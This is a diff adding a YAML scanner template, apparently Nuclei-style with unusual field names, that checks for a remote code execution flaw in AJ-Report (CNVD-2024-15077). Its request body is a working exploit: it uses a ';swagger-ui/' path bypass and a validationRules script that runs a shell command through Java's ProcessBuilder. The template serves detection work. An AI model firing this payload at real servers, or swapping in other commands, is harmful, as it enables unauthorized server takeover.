@@ -1,0 +1,30 @@
+id: CNVD-2024-15077
+brief:
+    title: AJ-Report Open Source Data Screen - Remote Code Execution
+    by: pussycat0x
+    level: high
+    about: AJ Report The platform can execute commands in the corresponding value of the validationRules parameter through post method, obtain server permissions, and log in to the management background to ta...
+    label:
+        - cnvd
+        - cnvd2024
+        - aj-report
+        - rce
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/dataSetParam/verification;swagger-ui/'
+      head:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: application/json;charset=UTF-8
+      body: '{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='''';while((line = r.readLine()) != null){ss+=line};return ss;}"}'
+      signs:
+        - "on": word
+          has:
+            - code
+            - data
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
